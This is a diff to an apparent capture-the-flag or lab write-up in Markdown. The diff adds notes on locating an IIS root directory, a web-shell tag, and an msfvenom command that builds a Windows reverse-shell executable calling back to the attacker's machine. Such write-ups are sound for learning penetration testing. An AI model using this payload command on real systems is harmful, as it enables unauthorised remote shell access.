@@ -227,15 +227,24 @@ Enumerated top 200 UDP ports:
 
 ![](Pasted%20image%2020221019010645.png)
 
-
-
+![](Pasted%20image%2020221019010904.png)
+#aspxcmdWebShell
 
 
 ---
 
 # Exploitation
 ## Name of the technique
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
+
+#### -Googled "Microsoft-IIS/10.10 root directory"
+
+![](Pasted%20image%2020221019011200.png)
+#Microsoft-IIS/10.0RootDirectory
+
+#### -Typed "msfvenom -p windows/shell_reverse_tcp LHOST=[kali IP] LPORT=593 -f exe > reverse.exe"
+
+
+
 
 ---
 
